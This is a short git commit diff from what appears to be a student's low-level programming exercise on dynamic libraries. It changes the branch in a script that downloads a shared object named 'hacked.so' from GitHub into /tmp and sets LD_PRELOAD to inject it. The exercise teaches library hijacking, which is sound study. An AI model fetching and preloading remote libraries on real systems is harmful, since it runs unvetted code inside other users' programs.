f3ac816939e6a4834d299ef3810248fab304e996
NwabuezeFranklin <nwafrank2017@gmail.com>
2022-07-13 05:40:52 -0700

    final

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/NwabuezeFranklin/alx-low_level_programming/raw/master/0x18-dynamic_libraries/hacked.so
+wget -P /tmp https://github.com/NwabuezeFranklin/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hacked.so
 export LD_PRELOAD=/tmp/hacked.so
